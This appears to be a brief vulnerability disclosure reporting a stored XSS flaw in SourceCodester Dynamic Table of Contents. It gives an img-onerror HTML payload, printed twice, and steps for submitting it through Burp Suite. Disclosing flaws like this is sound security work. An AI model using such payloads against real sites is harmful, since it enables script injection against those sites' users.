# Summary
There is a XSS vulnerability in SourceCodester Dynamic Table of Contents.

# Details
When adding the contents function, a malicious xss payload can be constructed in the added HTML:
```html
<img/src="x"/onerror=alert(`xss`);>
```

Use burpsuite to add it, save it and access the contents to trigger XSS.

![d-toc-XSS1](https://github.com/user-attachments/assets/235df8ca-1b4b-439c-aea6-1c321fe5b2db)


# PoC
```html
<img/src="x"/onerror=alert(`xss`);>
```

![d-toc-XSS1](https://github.com/user-attachments/assets/235df8ca-1b4b-439c-aea6-1c321fe5b2db)
